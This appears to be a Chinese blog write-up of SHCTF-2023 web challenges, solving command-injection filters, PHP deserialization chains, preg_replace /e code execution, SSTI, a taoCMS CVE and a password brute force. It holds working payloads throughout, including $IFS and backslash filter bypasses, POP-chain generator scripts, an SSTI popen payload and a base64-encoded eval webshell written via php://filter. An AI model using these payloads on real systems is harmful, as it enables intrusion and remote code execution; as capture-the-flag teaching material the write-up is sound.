---
title: "SHCTF-2023"
date: 2023-10-02
categories: 
  - "ctf"
tags: 
  - "ctf"
---

## _前言_

写完week1感觉还是比较简单的，很基础

也是放假在家不想打游戏，拿这个消磨一下时间

## WEEK1

### babyRCE

题目源码

```
<?php

$rce = $_GET['rce'];
if (isset($rce)) {
    if (!preg_match("/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\<|\'|\"/i", $rce)) {
        system($rce);
    }else {
            echo "hhhhhhacker!!!"."\n";
    }
} else {
    highlight_file(__FILE__);
}
```

过滤了部分命令和特殊符号

但是没有过滤掉反斜杠（ \\ ），空格我们可以用$IFS来绕过

然后查看文件的命令几乎都被禁了，但是可以通过反斜杠来连接字母形成命令

```
ca\t = cat ， l\s = ls #诸如此类
```

另外空格的一些绕过方式

```
$IFS
$IFS$1
${IFS}
$IFS$9
<               比如cat<a.tct:表示cat a.txt
<>
{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
%20
%09
```

这里当前目录下有一个flag.php，但是不正确

正确的在根目录下

![](./images/image-11.png)

拿到flag

![](./images/image-12.png)

### 1zzphp

```
 <?php 
error_reporting(0);
highlight_file('./index.txt');
if(isset($_POST['c_ode']) && isset($_GET['num']))
{
    $code = (String)$_POST['c_ode'];
    $num=$_GET['num'];
    if(preg_match("/[0-9]/", $num))
    {
        die("no number!");
    }
    elseif(intval($num))
    {
      if(preg_match('/.+?SHCTF/is', $code))
      {
        die('no touch!');
      }
      if(stripos($code,'2023SHCTF') === FALSE)
      {
        die('what do you want');
      }
      echo $flag;
    }
}  
```

preg\_match的绕过方式一般有（数组绕过、换行绕过、回溯溢出）

在这里num可以通过数组绕过

然是code就不行了，因为code是强制转换为string类型了，如果以数组的形式传入，那么code的值将变为Array，这个可以自己在本地测试

然后注意preg\_match的匹配方式是is，i是忽略大小写，s是忽略换行符

那么这里就只有尝试回溯溢出这个方法了

具体的在P神的博客里有，这里就不再赘述

链接：[PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

具体的操作就是在code部分生成至少1000000（一百万）个字符，这是preg\_match的最大深度，超过则不匹配

最终如图👇

![](./images/image-13.png)

### ez\_serialize

题目源码👇

```
<?php
highlight_file(__FILE__);

class A{
  public $var_1;
  
  public function __invoke(){
   include($this->var_1);
  }
}

class B{
  public $q;
  public function __wakeup()
{
  if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->q)) {
            echo "hacker";           
        }
}

}
class C{
  public $var;
  public $z;
    public function __toString(){
        return $this->z->var;
    }
}

class D{
  public $p;
    public function __get($key){
        $function = $this->p;
        return $function();
    }  
}

if(isset($_GET['payload']))
{
    unserialize($_GET['payload']);
}
?> 
```

可以看到在A类里有include函数，我们可以通过include来执行命令，这就是pop链的终点

整理一下思路可以看出

我们要先通过B类的wakeup，执行preg\_match函数，该函数会把B->q作为字符串进行匹配，然后就跳到C类的toString方法，该方法要return一个不存在的属性值，从而触发D类的\_\_get魔术方法，该方法会把p属性当作函数返回，触发A类的\_\_invoke魔术方法，最终进入include

```
POP链条：B:wakeup() ->  C:toString()  ->  D:__get()  ->  A:__invoke  -> include
```

最终如何读取文件？这里没有过滤掉filter，可以用他来读取文件

最终payload：

```
<?php
class A{
    public $var_1;
}

class B{
    public $q;
}
class C{
    public $var;
    public $z;
}

class D{
    public $p;
}
$b=new B();
$c=new C();
$b->q=$c;
$d=new D();
$c->z=$d;
$a=new A();
$d->p=$a;
$a->var_1='php://filter/convert.base64-encode/resource=flag.php';
echo serialize($b);
```

![](./images/image-14.png)

拿去Base64解码即可

### 登录就给flag

![](./images/image-15.png)

经过测试，不存在sql注入，后台也扫不出东西来

应该是密码爆破，用户名猜测是admin

抓个包，发到Intruder，使用Sniper单参数模式

![](./images/image-16.png)

在Payloads里选择密码这一栏，然后开始攻击

![](./images/image-17.png)

可以看到当密码是password的时候返回长度和状态码都不一样

![](./images/image-18.png)

密码应该就是password，登录进去拿到flag👇

![](./images/image-19.png)

### 飞机大战

一个飞机游戏

![](./images/image-20.png)

看看源码吧，这种题一般都在源码里找突破口

有一个main.js文件，进去看看，在最后找到一个flag关键词，好像是要scores要大于99999才弹出flag

![](./images/image-21.png)

这里其实我们只需要打开浏览器的控制台，将scores的值修改一下就行了

![](./images/image-22.png)

### ezphp

源码如下👇

```
<?php
error_reporting(0);
if(isset($_GET['code']) && isset($_POST['pattern']))
{
    $pattern=$_POST['pattern'];
    if(!preg_match("/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\<|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&|\*|\%/i",$code))
    {
        $code=$_GET['code'];
        preg_replace('/(' . $pattern . ')/ei','print_r("\\1")', $code);
        echo "you are smart";
    }else{
        die("try again");
    }
}else{
    die("it is begin");
}
?> 
```

一眼看到preg\_match的ei模式，其实这个e模式是有命令执行的漏洞的

可以参考文章：[深入研究preg\_replace \\e模式下的代码执行\_preg\_replace /e-CSDN博客](https://blog.csdn.net/weixin_49656607/article/details/119833707)

对于这三个参数的解释：

```
preg_replace(正则表达式，原本的字符串，用于替换的字符串);
```

如果在原本的字符串中正则匹配成功，就将其替换

而/e模式能够顺便执行替换字符串（如果是正确的命令哈

具体的也不多说了，上面参考文章写的肯定比我好

![](./images/image-23.png)

在phpinfo里找到flag

### 生成你的邀请函吧

题目描述：

```
API：url/generate_invitation  
Request：POST application/json  
Body：{  
    "name": "Yourname",  
    "imgurl": "http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&spec=640&img_type=jpg"  
}  
```

根据题目描述，我们要使用靶机实例的该API，POST发送请求

还是很简单的

抓个包修改一下即可

![](./images/image-24.png)

发送完后，浏览器会下载一张图片，在底部发现flag

![](./images/image-25.png)

## WEEK2

### no\_wake\_up

php代码如下

```
 <?php
highlight_file(__FILE__);
class flag{
    public $username;
    public $code;
    public function __wakeup(){
        $this->username = "guest";
    }
    public function __destruct(){
        if($this->username = "admin"){
            include($this->code);
        }
    }
}
unserialize($_GET['try']); 
```

在反序列化后会先执行wakeup，然后再执行destruct

在destruct里存在命令执行，这里只需要绕过wakeup就行了

经典的只需要把序列化字符串的变量值改大一个就可以了

但是这道题不知道怎么了，直接生成的字符串就能打进去

![](./images/image-61.png)

base64解码拿到flag

### MD5的事就拜托了

源码如下

```
 <?php
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['SHCTF'])){
    extract(parse_url($_POST['SHCTF']));
    if($$$scheme==='SHCTF'){
        echo(md5($flag));
        echo("</br>");
    }
    if(isset($_GET['length'])){
        $num=$_GET['length'];
        if($num*100!=intval($num*100)){
            echo(strlen($flag));
            echo("</br>");
        }
    }
}
if($_POST['SHCTF']!=md5($flag)){
    if($_POST['SHCTF']===md5($flag.urldecode($num))){
        echo("flag is".$flag);
    }
} 
```

先get传参length=1.000001，得出flag的长度为42

注意这这个parse\_url的用法，是将一个url分解为几个部分，然后用extract将变量引入环境

举个例子

```
<?php$url = 'http://username:password@hostname/path?arg=value#anchor';print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?>

#那么结果就应该是
Array
(
    [scheme] => http
    [host] => hostname
    [user] => username
    [pass] => password
    [path] => /path
    [query] => arg=value
    [fragment] => anchor
)
```

至于这个scheme前面的几个$符号，比如说$scheme=1，那么$$scheme相当于$1，$scheme的值就被作为变量名称再次被利用

下面是测试代码

```
<?php
print_r(parse_url("host://SHCTF:password@user"));
extract(parse_url("host://SHCTF:password@user"));
echo $scheme.PHP_EOL;
echo $$scheme.PHP_EOL;
echo $$$scheme.PHP_EOL;

#输出如下
Array
(
    [scheme] => host
    [host] => user
    [user] => SHCTF
    [pass] => password
)
host
user
SHCTF

```

那么这个字符串就可以传入POST了，拿到MD5值

![](./images/image-63.png)

到这里的话，就没思路了，下面是官方的wp

![](./images/1698759770-image.png)

![](./images/1698759779-image.png)

### EasyCMS

进去是一个类似博客的界面

![](./images/image-64.png)

进行信息搜集，发现这个taoCMS存在漏洞

贴一个文章：[taoCMS任意代码执行（CVE-2022-25578）-CSDN博客](https://blog.csdn.net/weixin_48968378/article/details/125871582)

访问后台管理登录页面，默认账号admin，密码是tao

在这里可以执行sql

![](./images/image-65.png)

不过flag不在当前数据库，在另外一个数据库中，可以用show查看

![](./images/image-66.png)

但是这里想查ctftraining库里的东西的时候，他就不回显了，不知道是不是没有东西

然后注意到左下角有个文件管理，里面可以编辑文件内容，可以在这里做木马

![](./images/image-67.png)

再去访问install.php即可命令执行

![](./images/image-68.png)

### ez\_ssti

吐槽一下：这道题什么东西都没有，传参都不知道传什么，后来还是搜题目才找到传name

也没什么好写的，直接拿以前写过的payload就爆出来了，甚至都不用跑脚本。。。

```
?name={{lipsum.__globals__.__getitem__('os').popen('cat /f*').read()}}
```

### serialize

代码如下👇

```
 <?php
highlight_file(__FILE__);
class misca{
    public $gao;
    public $fei;
    public $a;
    public function __get($key){
        $this->miaomiao();
        $this->gao=$this->fei;
        die($this->a);
    }
    public function miaomiao(){
        $this->a='Mikey Mouse~';
    }
}
class musca{
    public $ding;
    public $dong;
    public function __wakeup(){
        return $this->ding->dong;
    }
}
class milaoshu{
    public $v;
    public function __tostring(){
        echo"misca~musca~milaoshu~~~";
        include($this->v);
    }
}
function check($data){
    if(preg_match('/^O:\d+/',$data)){
        die("you should think harder!");
    }
    else return $data;
}
unserialize(check($_GET["wanna_fl.ag"])); 
```

先不管这个check函数，理清一下pop链

我们能够利用的是milaoshu里的include函数，他是被tostring触发的，而全看下来，能够触发tostring方法的也只有misca类里的die方法，该方法把参数以字符串输出，想要执行的话就要执行get魔术方法，这里要从musca类里的wakeup函数里调过来

所以总的pop链条就是

```
musca->__wakeup()  #1
misca->__get()     #2
milaoshu->include() #3
```

不过要注意的是在misca的get方法里，die能够输出的a参数是被miaomiao()函数重新赋值了

这里直接赋值a是不管用的，就只有使用取地址的方式，把gao的值取为a的地址，这样当赋值给gao的时候也就是赋值给了a，绕过了miaomiao函数

```
<?php
class misca{
    public $gao;
    public $fei;
    public $a;
    public function miaomiao(){
        $this->a='Mikey Mouse~';
    }

}
class musca{
    public $ding;
    public $dong;

}
class milaoshu{
    public $v='php://filter/convert.base64-encode/resource=flag.php';
}
$misca=new misca();
$musca=new musca();
$milaoshu=new milaoshu();
$musca->ding=$misca;
$misca->gao=&$misca->a;
$misca->fei=$milaoshu;
echo serialize($musca);

#O:5:"musca":2:{s:4:"ding";O:5:"misca":3:{s:3:"gao";N;s:3:"fei";O:8:"milaoshu":1:{s:1:"v";s:52:"php://filter/convert.base64-encode/resource=flag.php";}s:1:"a";R:3;}s:4:"dong";N;}
```

生成的pop链初步是这样的，不过这样是无法通过check函数

经过几番搜寻，发现在以前的CTF的题里面出现过这个考点

```
preg_match('/^O:\d+/')的绕过方式
1、利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）#php版本大于5.6就不行了好像
2、serialize(array(a));a 为要反序列化的对象 (序列化结果开头是 a，不影响作为数组元素的 $a 的析构) #这个就可以
```

最终poc如下👇

```
<?php
class misca{
    public $gao;
    public $fei;
    public $a;
    public function miaomiao(){
        $this->a='Mikey Mouse~';
    }

}
class musca{
    public $ding;
    public $dong;

}
class milaoshu{
    public $v='php://filter/convert.base64-encode/resource=flag.php';
}

$misca=new misca();
$musca=new musca();
$milaoshu=new milaoshu();
$musca->ding=$misca;
$misca->gao=&$misca->a;
$misca->fei=$milaoshu;
echo serialize($musca);
echo PHP_EOL;
$x=serialize(array($musca));
echo $x;

#a:1:{i:0;O:5:"musca":2:{s:4:"ding";O:5:"misca":3:{s:3:"gao";N;s:3:"fei";O:8:"milaoshu":1:{s:1:"v";s:52:"php://filter/convert.base64-encode/resource=flag.php";}s:1:"a";R:4;}s:4:"dong";N;}}
```

## WEEK3

### 快问快答

![](./images/1697699741-image.png)

写个脚本爆破就行，但是既不能太快也不能太慢，服务器好像撑不住。。。

```
import re
import time
import requests
session=requests.session()
url='http://112.6.51.212:31707'
pattern=re.compile('(\d+) (.+) (\d+) =')
result=0
payload={"answer":f'{result}'}
for i in range(65):
    time.sleep(1)

    try:
        r=session.post(url,payload)
        print(r.text)

        calc=re.findall(pattern,r.text)[0]
        num1=calc[0]
        sym=calc[1]
        num2=calc[2]
        if '异或' == sym:
            result=int(num1)^int(num2)
        if '与' == sym:
            result=int(num1)&int(num2)
        if '÷' ==sym:
            result=int(int(num1)/int(num2))
        if 'x' ==sym:
            result=int(num1)*int(num2)
        if '+' == sym:
            result = int(num1) + int(num2)
        if '-' ==sym:
            result = int(num1) - int(num2)
        payload = {"answer": f'{result}'}
        print(i,calc,result)
    except IndexError :
        print(r.text)
        print('indexx error')
        exit()
    except InterruptedError:
        print("interupt")
    else:
        pass
    time.sleep(0.5)

print(r.text)
print(r.cookies)
```

![](./images/1697699797-image-1024x466.png)

### sseerriiaalliizzee

php源码如下👇

```
 <?php
error_reporting(0);
highlight_file(__FILE__);

class Start{
    public $barking;
    public function __construct(){
        $this->barking = new Flag;
    }
    public function __toString(){
            return $this->barking->dosomething();
    }
}

class CTF{ 
    public $part1;
    public $part2;
    public function __construct($part1='',$part2='') {
        $this -> part1 = $part1;
        $this -> part2 = $part2;
        
    }
    public function dosomething(){
        $useless   = '<?php die("+Genshin Impact Start!+");?>';
        $useful= $useless. $this->part2;
        file_put_contents($this-> part1,$useful);
    }
}
class Flag{
    public function dosomething(){
        include('./flag,php');
        return "barking for fun!";
        
    }
}

    $code=$_POST['code']; 
    if(isset($code)){
       echo unserialize($code);
    }
    else{
        echo "no way, fuck off";
    }
?> 
```

关键点在于CTF类里的dosomething函数，这里面有一个file\_put\_contents可以利用

但是文件内容是有一个die函数，当我们访问生成的文件时，走到die函数就结束，自己写的内容就无效了

这里贴一个博客：[file\_put\_contents利用技巧(php://filter协议） - yokan - 博客园 (cnblogs.com)](https://www.cnblogs.com/yokan/p/12650702.html)讲的很不错的

这里就利用filter伪协议搭配过滤器绕过这个file\_put\_contents就可以了

生成反序列化字符串的poc👇

```
<?php
class Start{
    public $barking;

}

class CTF{
    public $part1='php://filter/write=string.strip_tags|convert.base64-decode/resource=hyh.php';
    public $part2='PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==';# @eval($_POST[a]);

}
$a=new Start();
$b=new CTF();
$a->barking=$b;
echo serialize($a);
#O:5:"Start":1:{s:7:"barking";O:3:"CTF":2:{s:5:"part1";s:75:"php://filter/write=string.strip_tags|convert.base64-decode/resource=hyh.php";s:5:"part2";s:36:"PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==";}}
```

![](./images/1697704696-image.png)

### gogogo

这道题的话，网上也能搜到类似的题目

由于没有打通，这里还是贴一下官方的wp

![](./images/1698759878-image.png)

go语言的环境要自己安装，安装好后把题目附件里的代码session部分修改如图

然后会跑出来一个cookie，这里burp更换cookie即可绕过第一关

![](./images/1698759944-image.png)
